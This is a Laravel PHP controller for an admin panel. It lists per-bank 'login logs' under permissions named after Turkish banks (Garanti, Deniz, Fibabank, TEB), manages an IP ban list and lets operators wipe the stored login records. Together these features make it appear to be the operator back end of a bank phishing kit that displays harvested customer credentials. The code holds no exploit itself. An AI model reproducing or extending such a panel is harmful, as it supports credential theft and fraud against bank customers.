<?php

namespace App\Http\Controllers;

use App\Attributes\HasPermissions;
use App\Classes\SystemStatusEnum;
use App\DataTables\IpListModelDataTable;
use App\DataTables\LoginDModelDatatable;
use App\DataTables\LoginFModelDatatable;
use App\DataTables\LoginTModelDatatable;
use App\DataTables\LoginModelDataTable;
use App\Models\IpListModel;
use App\Models\LoginModel;
use Illuminate\Http\Request;
use Illuminate\Http\RedirectResponse;
use Illuminate\Support\Facades\Auth;
use Hash;
use Illuminate\Support\Facades\URL;

class LogController extends Controller
{
    public function login()
    {
        if (Auth::check()) {
            return redirect()->route('sites.index');
        }
        return view('admin.login');
    }

    public function logout()
    {
        Auth::logout();
        return redirect()->route('admin.login');
    }

    #[HasPermissions('garanti')]
    public function listByLogin(LoginModelDataTable $dataTable)
    {
        return $dataTable->render('admin.datatable', ['title' => SystemStatusEnum::G->label() . ' Logları', 'page' => 'login-log']);
    }
    #[HasPermissions('deniz')]
    public function listByDLogin(LoginDModelDatatable $dataTable)
    {
        return $dataTable->render('admin.datatable', ['title' => SystemStatusEnum::D->label() . ' Logları', 'page' => 'login-log']);
    }

    #[HasPermissions('fibabank')]
    public function listByFLogin(LoginFModelDatatable $dataTable)
    {
        return $dataTable->render('admin.datatable', ['title' => SystemStatusEnum::F->label() . ' Logları', 'page' => 'login-log']);
    }

    #[HasPermissions('teb')]
    public function listByTLogin(LoginTModelDatatable $dataTable)
    {
        return $dataTable->render('admin.datatable', ['title' => SystemStatusEnum::T->label() . ' Logları', 'page' => 'login-log']);
    }

    #[HasPermissions('iplist')]
    public function listByIp(IpListModelDataTable $dataTable)
    {
        $title = 'Ip Listesi';
        return $dataTable->render('admin.datatable', ['title' => $title]);
    }

    #[HasPermissions('iplist')]
    public function actionByIp(Request $request)
    {
        if ($request->id) {
            IpListModel::find($request->id)->update(['ban' => $request->action]);
        }

        return back();
    }
    public function auth(Request $request): RedirectResponse
    {
        $credentials = $request->validate([
            'email' => ['required', 'email'],
            'password' => ['required'],
        ]);

        if (Auth::attempt($credentials)) {
            $request->session()->regenerate();
            $permName = strtolower(SystemStatusEnum::G->label());
            $hasG = auth()->user()->permissions->pluck('name')->contains($permName);
            if ($hasG || auth()->user()->hasPermissionTo('super')) {
                return redirect()->route('admin.listlogin');
            } else {
                return redirect()->route('admin.listdlogin');
            }
        }

        return back()->withErrors([
            'email' => 'The provided credentials do not match our records.',
        ])->onlyInput('email');
    }
    #[HasPermissions('garanti', 'deniz')]
    public function resetDB(Request $request)
    {
        LoginModel::query()->update(['deleted_at' => now()]);
        return back();
    }
}
